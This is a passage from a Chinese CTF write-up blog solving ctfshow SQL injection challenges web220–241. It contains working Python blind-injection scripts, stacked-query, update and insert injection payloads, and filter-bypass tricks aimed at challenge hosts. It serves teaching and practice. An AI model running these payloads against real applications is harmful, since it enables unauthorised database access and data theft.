&#125;        try:            r&#x3D;requests.post(url&#x3D;url,data&#x3D;data,timeout&#x3D;0.15)            min&#x3D;j        except:            max&#x3D;j        time.sleep(0.1)</code></pre><h2 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h2><pre><code>//屏蔽危险分子function waf($str)&#123;    return preg_match(&#39;/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i&#39;,$str);&#125;   </code></pre><p>payload同上</p><p>或者</p><p>过滤ascii和substr可以用like代替,在构造 payload 的时候使用 limit 限制查询条数，从而绕过 concat 的限制,在上题exp基础上修改一下即可</p><pre class="language-python" data-language="python"><code class="language-python">#@Auth：Sentimentimport requestsimport time as turl&#x3D;&#39;http:&#x2F;&#x2F;b25594e9-ab57-43ce-a255-7b87f771b72a.challenge.ctf.show&#x2F;api&#x2F;index.php&#39;flag&#x3D;&#39;ctfshow&#123;&#39;for i in range(1,50):    for j in &#39;abcdefghijklmnopqrstuvwxyz1234567890-_&#123;&#125;&#39;:        data&#x3D;&#123;        #&#39;ip&#39;:&quot;if((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1) like &#39;&#123;&#125;&#39;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)&quot;.format(flag + j + &quot;%&quot;),&#39;debug&#39;:&quot;0&quot; # ctfshow_flagxcac        #&#39;ip&#39;:&quot;if((select column_name from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagxcac&#39; limit 1,1) like &#39;&#123;&#125;&#39;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)&quot;.format(flag + j + &quot;%&quot;),&#39;debug&#39;:&quot;0&quot; # flagaabcc        &#39;ip&#39;:&quot;if((select flagaabcc from ctfshow_flagxcac) like &#39;&#123;&#125;&#39;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)&quot;.format(flag + j + &quot;%&quot;),&#39;debug&#39;:&quot;0&quot; #ctfshow&#123;e97ffaa2-9de8-4b3d-a623-1a09ad9eeb83&#125;        &#125;        print(data)        try:           r &#x3D; requests.post(url&#x3D;url,data&#x3D;data,timeout&#x3D;0.15)        except:            flag+&#x3D;j            print(flag)            break        t.sleep(0.3)</code></pre><h2 id="web221"><a href="#web221" class="headerlink" title="web221"></a>web221</h2><p>盲注终于结束了，尤其是时间盲注，感觉又费时又费力。</p><blockquote><p>limit注入</p></blockquote><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;分页查询$sql &#x3D; select * from ctfshow_user limit ($page-1)*$limit,$limit;    </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;TODO:很安全，不需要过滤&#x2F;&#x2F;拿到数据库名字就算你赢      </code></pre><p>看一下这个查询语句</p><pre class="language-sql" data-language="sql"><code class="language-sql">select * from tableName limit i,n# tableName：表名# i：为查询结果的索引值(默认从0开始)，当i&#x3D;0时可省略i# n：为查询结果返回的数量# i与n之间使用英文逗号&quot;,&quot;隔开#limit n 等同于 limit 0,n</code></pre><p><a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html</a></p><p>p牛的文章</p><p>里面写道</p><blockquote><p>在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的，那么使用PROCEDURE函数能否注入呢</p></blockquote><p>那肯定是能注入的</p><p>下面是p牛的尝试过程</p><pre class="language-none"><code class="language-none">mysql&gt; SELECT field FROM table where id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE ANALYSE(1); ERROR 1386 (HY000): Can&#39;t use ORDER clause with this procedure</code></pre><p>ANALYSE可以有两个参数：</p><pre class="language-none"><code class="language-none">mysql&gt; SELECT field FROM table where id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE ANALYSE(1,1); ERROR 1386 (HY000): Can&#39;t use ORDER clause with this procedure</code></pre><p>看起来并不是很好，继续尝试：</p><pre class="language-none"><code class="language-none">mysql&gt; SELECT field from table where id &gt; 0 order by id LIMIT 1,1 procedure analyse((select IF(MID(version(),1,1) LIKE 5, sleep(5),1)),1);</code></pre><p>但是立即返回了一个错误信息： </p><pre class="language-none"><code class="language-none">ERROR 1108 (HY000): Incorrect parameters to procedure &#39;analyse&#39;</code></pre><p>sleep函数肯定没有执行，但是最终我还是找到了可以攻击的方式： </p><pre class="language-none"><code class="language-none">mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); ERROR 1105 (HY000): XPATH syntax error: &#39;:5.5.41-0ubuntu0.14.04.1&#39;</code></pre><p>如果不支持报错注入的话，还可以基于时间注入：</p><pre class="language-none"><code class="language-none">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</code></pre><p>直接使用sleep不行，需要用BENCHMARK代替。 </p><p>可以看到这里是利用了报错的方式注出了内容</p><p>适用范围 5.0.0&lt; MySQL &lt;5.6.6</p><p>而这道题里也开启了报错</p><p>当没有id这一参数时</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511133031946.png" alt="image-20220511133031946"></p><pre class="language-sql" data-language="sql"><code class="language-sql">1 procedure analyse(extractvalue(rand(),concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))),1)</code></pre><p>不知道为什么出不来数据（虽说只要注到库名就行</p><h2 id="web222"><a href="#web222" class="headerlink" title="web222"></a>web222</h2><blockquote><p>group 注入</p></blockquote><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;分页查询$sql &#x3D; select * from ctfshow_user group by $username;    </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;TODO:很安全，不需要过滤      </code></pre><p>参数在group后边</p><p>group by可用于时间盲注,举个例子：</p><pre class="language-none"><code class="language-none">select * from users group by 1,if(1&#x3D;1,sleep(0.5),1);1</code></pre><p>查询每一行时都需要执行sleep,我有5行数据所以需要大约5*0.5秒=2.5秒左右的时间</p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport timeurl&#x3D;&#39;http:&#x2F;&#x2F;9f4a1dc4-86c8-4876-b732-f5ffd6be8114.challenge.ctf.show&#x2F;api&#x2F;index.php?u&#x3D;&#39;flag&#x3D;&#39;&#39;for i in range(1,100):    min&#x3D;32    max&#x3D;128    while 1:        j&#x3D;min+(max-min)&#x2F;&#x2F;2        if min&#x3D;&#x3D;j:            flag+&#x3D;chr(j)            print(flag)            break        #payload&#x3D;f&quot;1,if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.02),1)&quot;        #payload&#x3D;f&quot;1,if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flaga&#39;),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.02),1)&quot;        payload&#x3D;f&quot;1,if(ascii(substr((select group_concat(flagaabc) from ctfshow_flaga),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.02),1)&quot;        try:            r&#x3D;requests.get(url&#x3D;url+payload,timeout&#x3D;0.4)            min&#x3D;j        except:            max&#x3D;j        time.sleep(0.2)</code></pre><p>这里我们可以试一下group by常规的报错语句</p><pre class="language-none"><code class="language-none">select count(*) from users group by concat(database(),floor(rand(0)*2));</code></pre><p>发现能查出东西，那我们也可以利用布尔盲注</p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport timeurl&#x3D;&#39;http:&#x2F;&#x2F;60eb33c3-f99f-40ab-a612-d0085affb66a.challenge.ctf.show&#x2F;api&#x2F;index.php?u&#x3D;&#39;flag&#x3D;&#39;&#39;for i in range(1,100):    min&#x3D;32    max&#x3D;128    while 1:        j&#x3D;min+(max-min)&#x2F;&#x2F;2        if min&#x3D;&#x3D;j:            flag+&#x3D;chr(j)            print(flag)            break        #payload&#x3D;f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;i&#125;,1))&lt;&#123;j&#125;,username,id)&quot;        #payload&#x3D;f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flaga&#39;),&#123;i&#125;,1))&lt;&#123;j&#125;,username,id)&quot;        payload&#x3D;f&quot;if(ascii(substr((select group_concat(flagaabc) from ctfshow_flaga),&#123;i&#125;,1))&lt;&#123;j&#125;,username,id)&quot;        r&#x3D;requests.get(url&#x3D;url+payload).text        #print(r.text)        if len(r)&lt;288:            max&#x3D;j        else:            min&#x3D;j</code></pre><h2 id="web223"><a href="#web223" class="headerlink" title="web223"></a>web223</h2><p>还是group注入</p><p>但是 过滤了数字，也就是说用substr之类的函数不能直接用了</p><p>但是经过测试还是能够盲注</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511141529576.png" alt="image-20220511141529576"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511141551392.png" alt="image-20220511141551392"></p><p>看出返回值不同，而数字可以利用web185里提到的true代替</p><pre class="language-python" data-language="python"><code class="language-python">&quot;&quot;&quot;Author:Y4tacker&quot;&quot;&quot;import requestsdef generateNum(num):    res &#x3D; &#39;true&#39;    if num &#x3D;&#x3D; 1:        return res    else:        for i in range(num - 1):            res +&#x3D; &quot;+true&quot;        return resurl &#x3D; &quot;http:&#x2F;&#x2F;ff765902-0dec-4688-8cd2-1a4cc429d30a.chall.ctf.show&#x2F;api&#x2F;&quot;i &#x3D; 0res &#x3D; &quot;&quot;while 1:    head &#x3D; 32    tail &#x3D; 127    i &#x3D; i + 1    while head &lt; tail:        mid &#x3D; (head + tail) &gt;&gt; 1        # 查数据库-ctfshow_flagas        # payload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;        # 查字段-flagasabc        # payload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagas&#39;&quot;        # 查flag        payload &#x3D; &quot;select flagasabc from ctfshow_flagas&quot;        params &#x3D; &#123;            &quot;u&quot;: f&quot;if(ascii(substr((&#123;payload&#125;),&#123;generateNum(i)&#125;,&#123;generateNum(1)&#125;))&gt;&#123;generateNum(mid)&#125;,username,&#39;a&#39;)&quot;        &#125;        r &#x3D; requests.get(url, params&#x3D;params)        # print(r.json()[&#39;data&#39;])        if &quot;userAUTO&quot; in r.text:            head &#x3D; mid + 1        else:            tail &#x3D; mid    if head !&#x3D; 32:        res +&#x3D; chr(head)    else:        break    print(res)</code></pre><h2 id="web224"><a href="#web224" class="headerlink" title="web224"></a>web224</h2><p>在robots.txt里找到一个重置密码的页面，重置之后直接登录，看到文件上传的页面</p><p>然后试了试，怎么感觉什么也传不上去</p><p>ctfshow的群里有个payload.bin把这个传上去之后就直接生成了一个木马</p><p>访问1.php命令执行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511143349476.png" alt="image-20220511143349476"></p><p>原理看这个</p><p><a href="https://blog.gem-love.com/ctf/2283.html#%E4%BD%A0%E6%B2%A1%E8%A7%81%E8%BF%87%E7%9A%84%E6%B3%A8%E5%85%A5">https://blog.gem-love.com/ctf/2283.html#%E4%BD%A0%E6%B2%A1%E8%A7%81%E8%BF%87%E7%9A%84%E6%B3%A8%E5%85%A5</a></p><h2 id="web225"><a href="#web225" class="headerlink" title="web225"></a>web225</h2><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;分页查询$sql &#x3D; &quot;select id,username,pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;    </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;师傅说过滤的越多越好if(preg_match(&#39;&#x2F;file|into|dump|union|select|update|delete|alter|drop|create|describe|set&#x2F;i&#39;,$username))&#123;  die(json_encode($ret));&#125;    </code></pre><p>题目提示是堆叠注入了</p><p>select被过滤了，利用常规的堆叠注入</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511150345663.png" alt="image-20220511150345663"></p><p>只能查到这了</p><p>和强网杯那道差不多</p><p>先让我们看看强网杯的payload</p><pre class="language-sql" data-language="sql"><code class="language-sql">方法一 使用rename和alter1&#39;;rename tables &#96;words&#96; to &#96;words1&#96;;rename tables &#96;1919810931114514&#96; to &#96;words&#96;; alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100);#方法二 使用handler0&#39;;handler &#96;1919810931114514&#96; open;handler &#96;1919810931114514&#96; read first;#方法三 使用预处理语句0&#39;;set @sql&#x3D;concat(&#39;sele&#39;,&#39;ct &#96;flag&#96; from &#96;1919810931114514&#96;&#39;);PREPARE stmt1 from @sql;EXECUTE stmt1;#</code></pre><p>而这道题alter被过滤了，所以可以利用预处理，或者是handler</p><p>又因为过滤了set，方法三所以直接写语句就行</p><p><a href="https://blog.csdn.net/solitudi/article/details/107823398">https://blog.csdn.net/solitudi/article/details/107823398</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/108583338">(4条消息) 攻防世界-Web高手进阶区-supersqli(强网杯的随便注)_rfrder的博客-CSDN博客</a></p><h3 id="预处理SQL"><a href="#预处理SQL" class="headerlink" title="预处理SQL"></a>预处理SQL</h3><p>预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。　MySQL 预处理语句的支持版本较早，所以我们目前普遍使用的 MySQL 版本都是支持这一语法的。<br>简单用法：</p><p>使用方法<br>MySQL 官方将 prepare、execute、deallocate 统称为 PREPARE STATEMENT。翻译也就习惯的称其为预处理语句。</p><pre class="language-none"><code class="language-none">PREPARE name from &#39;[my sql sequece]&#39;;   &#x2F;&#x2F;预定义SQL语句EXECUTE name;  &#x2F;&#x2F;执行预定义SQL语句(DEALLOCATE || DROP) PREPARE name;  &#x2F;&#x2F;删除预定义SQL语句</code></pre><p>字符串定义预处理</p><pre class="language-none"><code class="language-none">PREPARE stmt1 FROM &#39;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#39;;ET @a &#x3D; 3;SET @b &#x3D; 4;                                                   EXECUTE stmt1 USING @a, @b;</code></pre><p>变量定义预处理 SQL</p><pre class="language-none"><code class="language-none">SET @s &#x3D; &#39;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#39;;PREPARE stmt2 FROM @s;SET @c &#x3D; 6;ET @d &#x3D; 8;EXECUTE stmt2 USING @c, @d;DEALLOCATE PREPARE stmt2;</code></pre><p>在这道题里就是这样的</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;;prepare Sentiment from concat(char(115,101,108,101,99,116),&#39;* from ctfshow_flagasa&#39;);execute Sentiment;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511151309635.png" alt="image-20220511151309635"></p><h3 id="handler"><a href="#handler" class="headerlink" title="handler"></a>handler</h3><p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p><p>payload</p><pre class="language-sql" data-language="sql"><code class="language-sql">ctfshow&#39;;handler &#96;ctfshow_flagasa&#96; open;handler &#96;ctfshow_flagasa&#96; read first;--+</code></pre><h2 id="web226、228、229、230"><a href="#web226、228、229、230" class="headerlink" title="web226、228、229、230"></a>web226、228、229、230</h2><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;分页查询$sql &#x3D; &quot;select id,username,pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;    </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;师傅说过滤的越多越好if(preg_match(&#39;&#x2F;file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(&#x2F;i&#39;,$username))&#123;  die(json_encode($ret));&#125;</code></pre><p>show被过滤了，那handle就用不了了，因为不能直接show tables看表名，所以只能利用预处理了</p><p>转十六进制就行</p><pre class="language-sql" data-language="sql"><code class="language-sql">&#39;;prepare a from 0x73686f77207461626c6573;execute a;#</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511152014805.png" alt="image-20220511152014805"></p><pre class="language-sql" data-language="sql"><code class="language-sql">&#39;;prepare a from 0x73656c656374202a2066726f6d2063746673685f6f775f666c61676173;execute a;#</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511152050147.png" alt="image-20220511152050147"></p><p>当然，要是想预处理查出表名之后再用handler也不是不行（</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511152314670.png" alt="image-20220511152314670"></p><h2 id="web227"><a href="#web227" class="headerlink" title="web227"></a>web227</h2><p>表里没flag</p><p>这道题考点其实是<code>查看MySQL的存储过程</code><br>看看网上这篇文章<a href="https://blog.csdn.net/qq_41573234/article/details/80411079">MySQL——查看存储过程和函数</a><br>我们去查<code>information_schema.routines</code>表</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511163703317.png" alt="image-20220511163703317"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511163652949.png" alt="image-20220511163652949"></p><h2 id="web231"><a href="#web231" class="headerlink" title="web231"></a>web231</h2><blockquote><p>update注入</p></blockquote><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;分页查询$sql &#x3D; &quot;update ctfshow_user set pass &#x3D; &#39;&#123;$password&#125;&#39; where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;    </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;无过滤</code></pre><p>可以看见这里就不是查询语句，而是用update来更新</p><blockquote><p>update更新数据</p></blockquote><p>注入点是api的password和username，都是传POST</p><p>可以通过闭合password,在第一个注入点执行where条件查询语句,并将后边的where闭合掉(注入点/api/ post传参username,password),或者是利用时间盲注</p><p>当我们POST一个password=user&#39;,username=database()#&amp;username=1</p><p>刷新一下那个查询界面，就会发现，都变成了ctfshow_web</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511172837773.png" alt="image-20220511172837773"></p><p>因为这时候的语句为</p><pre class="language-sql" data-language="sql"><code class="language-sql">update ctfshow_user set pass &#x3D; &#39;user&#39;,username&#x3D;database()#&amp;username&#x3D;1&#39; where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;</code></pre><p>也就是</p><pre class="language-sql" data-language="sql"><code class="language-sql">update ctfshow_user set pass &#x3D; &#39;user&#39;,username&#x3D;database()</code></pre><p>将database()覆盖了username原来的数据，实现了sql注入</p><p>然后就是查表查列名查flag了</p><p>payload</p><pre class="language-sql" data-language="sql"><code class="language-sql">password&#x3D;user&#39;,username&#x3D;(select flagas from flaga) where 1&#x3D;1#&amp;username&#x3D;1</code></pre><h2 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h2><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;分页查询$sql &#x3D; &quot;update ctfshow_user set pass &#x3D; md5(&#39;&#123;$password&#125;&#39;) where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;    </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;无过滤</code></pre><p>password经过了md5加密</p><p>但是我们可以尝试闭合md5函数，实现逃逸</p><p>比如输入</p><pre class="language-sql" data-language="sql"><code class="language-sql">password&#x3D;1&#39;),username&#x3D;database()#&amp;username&#x3D;1</code></pre><p>然后整个语句变为</p><pre class="language-sql" data-language="sql"><code class="language-sql">update ctfshow_user set pass &#x3D; md5(&#39;1&#39;),username&#x3D;database()#&#39;) where username &#x3D; &#39;1&#39;;&quot;;</code></pre><p>也就是</p><pre class="language-sql" data-language="sql"><code class="language-sql">update ctfshow_user set pass &#x3D; md5(&#39;1&#39;),username&#x3D;database()</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511174011548.png" alt="image-20220511174011548"></p><p>后边就和web231一样了</p><h2 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h2><p>和231一样的代码，也没过滤，就是不给回显了</p><p>用这个测一下发现能时间盲注</p><pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;1&#39; or if(1&#x3D;1,sleep(0.02),0)#&amp;password&#x3D;1</code></pre><pre class="language-none"><code class="language-none">import requestsimport timeurl&#x3D;&#39;http:&#x2F;&#x2F;7cf24fdd-904d-48f6-81ac-0b88a27076ca.challenge.ctf.show&#x2F;api&#x2F;&#39;flag&#x3D;&#39;&#39;for i in range(60):    min&#x3D;32    max&#x3D;128    while 1:        j&#x3D;min+(max-min)&#x2F;&#x2F;2        if min&#x3D;&#x3D;j:            flag+&#x3D;chr(j)            print(flag)            break        #payload&#x3D;f&quot;&#39; or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.02),1)#&quot;        #payload&#x3D;f&quot;&#39; or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag233333&#39;),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.02),1)#&quot;        payload&#x3D;f&quot;&#39; or if(ascii(substr((select group_concat(flagass233) from flag233333),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.02),1)#&quot;        data&#x3D;&#123;            &#39;username&#39;: payload,            &#39;password&#39;:&#39;1&#39;&#125;        try:            r&#x3D;requests.post(url&#x3D;url,data&#x3D;data,timeout&#x3D;0.35)            min&#x3D;j        except:            max&#x3D;j        time.sleep(0.3)</code></pre><h2 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h2><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;分页查询$sql &#x3D; &quot;update ctfshow_user set pass &#x3D; &#39;&#123;$password&#125;&#39; where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;    </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;无过滤</code></pre><p>虽然嘴上说着没过滤，但是实际上还是过滤了单引号</p><p>可以用斜杠注释掉后面的斜杠，让它与username的第一个单引号闭合</p><p>这时的语句为</p><pre class="language-sql" data-language="sql"><code class="language-sql">$sql &#x3D; &quot;update ctfshow_user set pass &#x3D; &#39;\&#39; where username &#x3D; &#39;username&#39;;&quot;;</code></pre><p>因为username可控，我们只要吧最后一个引号注释，那么<code>\&#39; where username = </code>这部分就相当于password的值，</p><p>所以当我们输入<code>password=\&amp;username=,username=database();#</code>时</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511175743362.png" alt="image-20220511175743362"></p><p>然后就是正常的查询了</p><pre class="language-txt" data-language="txt"><code class="language-txt">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())##banlist,ctfshow_user,flag23apassword&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x666c6167323361)#因为过滤了单引号，所以16进制绕过。#id,flagass23s3,infopassword&#x3D;\&amp;username&#x3D;,username&#x3D;(select flagass23s3 from flag23a)#</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511180002985.png" alt="image-20220511180002985"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511180011342.png" alt="image-20220511180011342"></p><h2 id="web235"><a href="#web235" class="headerlink" title="web235"></a>web235</h2><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;分页查询$sql &#x3D; &quot;update ctfshow_user set pass &#x3D; &#39;&#123;$password&#125;&#39; where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;    </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;过滤 or &#39; </code></pre><p>过滤了or就不能用information了，可以试试从其他表里找表名</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511224228030.png" alt="image-20220511224228030"></p><p>用mysql.innodb_table_stats来代替information_schema。table_schema就要改成database_name。语句则是</p><pre class="language-sql" data-language="sql"><code class="language-sql">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database())#</code></pre><p>看到表名之后就是利用无列名注入了</p><p><a href="https://www.cnblogs.com/GH-D/p/11962522.html">https://www.cnblogs.com/GH-D/p/11962522.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/98206699">https://zhuanlan.zhihu.com/p/98206699</a></p><p>最终payload为</p><pre class="language-sql" data-language="sql"><code class="language-sql">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(&#96;2&#96;) from (select 1,2,3 union select * from flag23a1)a)#</code></pre><h2 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h2><blockquote><p>update</p></blockquote><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;分页查询$sql &#x3D; &quot;update ctfshow_user set pass &#x3D; &#39;&#123;$password&#125;&#39; where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;    </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;过滤 or &#39; flag</code></pre><p>其实没过滤，用上个题的payload就行</p><p>如果过滤了也可以用这个</p><pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;,username&#x3D;(select to_base64(b) from (select 1,2 as b,3 union select * from flaga limit 1,1)a)-- - &amp;password&#x3D;\</code></pre><h2 id="web237"><a href="#web237" class="headerlink" title="web237"></a>web237</h2><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;插入数据$sql &#x3D; &quot;insert into ctfshow_user(username,pass) value(&#39;&#123;$username&#125;&#39;,&#39;&#123;$password&#125;&#39;);&quot;;</code></pre><p>insert就是插入。但其实注入方式和一般的没有区别,只是说自己构造出查询语句，查询的结果返回在那个表当中了</p><p>通过第一个注入点将后边’)&#39;闭合即可</p><pre class="language-none"><code class="language-none">username&#x3D;helloworld&#39;,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))#&amp;password&#x3D;1username&#x3D;helloworld&#39;,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;));#&amp;password&#x3D;1username&#x3D;helloworld&#39;,(select group_concat(flagass23s3) from flag))#&amp;password&#x3D;1</code></pre><h2 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h2><p>insert注入，过滤空格</p><p>用括号注释符都能替代</p><pre class="language-none"><code class="language-none">username&#x3D;helloworld&#39;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())));#&amp;password&#x3D;1username&#x3D;helloworld&#39;,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;flagb&#39;)));#&amp;password&#x3D;1username&#x3D;helloworld&#39;,(select(group_concat(flag))from(flagb)));#&amp;password&#x3D;1</code></pre><h2 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h2><p>过滤了空格和or，因为过滤了or，所以information_schema就用不了了，可以参考web235</p><pre class="language-none"><code class="language-none">username&#x3D;1&#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name&#x3D;database())))#&amp;password&#x3D;1</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511225919771.png" alt="image-20220511225919771"></p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;,(select(flag)from(flagbb)));#&amp;password&#x3D;1</code></pre><h2 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h2><p>Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写。过滤空格 or sys mysql</p><p>根据前面都是在flag里，所以flag先确定下来。然后直接写脚本</p><pre class="language-sql" data-language="sql"><code class="language-sql">import requestsimport itertoolsurl &#x3D; &quot;http:&#x2F;&#x2F;a31fe426-9043-4aaf-b986-6270c466a4da.challenge.ctf.show&#x2F;api&#x2F;insert.php&quot;for i in itertools.product(&#39;ab&#39;, repeat &#x3D; 5):    tables &#x3D; &quot;flag&quot; + &#39;&#39;.join(i)    payload &#x3D; &#123;        &#39;username&#39;: f&quot;hellow0rld&#39;,(select(group_concat(flag))from(&#123;tables&#125;)))#&quot;,        &#39;password&#39;: &#39;1&#39;    &#125;    r &#x3D; requests.post(url&#x3D;url, data&#x3D;payload)</code></pre><p>纯爆破</p><h2 id="web241"><a href="#web241" class="headerlink" title="web241"></a>web241</h2><p>sql语句</p><pre class="language-none"><code class="language-none">$sql &#x3D; &quot;delete from ctfshow_user where id &#x3D; &#123;$id&#125;&quot;;</code></pre><p>delete函数在进行判断后会回显删除成功、或删除失败,所以就不能给予回显内容来爆破数据、所以这里用时间盲注</p><pre class="language-sql" data-language="sql"><code class="language-sql">#@Auth：Sentimentimport requestsurl&#x3D;&#39;http:&#x2F;&#x2F;80bc5222-eeb8-4d94-a68a-57d494f5809e.challenge.ctf.show&#x2F;api&#x2F;delete.php&#39;flag&#x3D;&#39;&#39;for i in range(1,50):    m&#x3D;32    n&#x3D;127    while 1:        mid&#x3D;(m+n)&#x2F;&#x2F;2        data&#x3D;&#123;        #&#39;id&#39;:&quot;if(ascii(substr((select group_concat(table_name) from 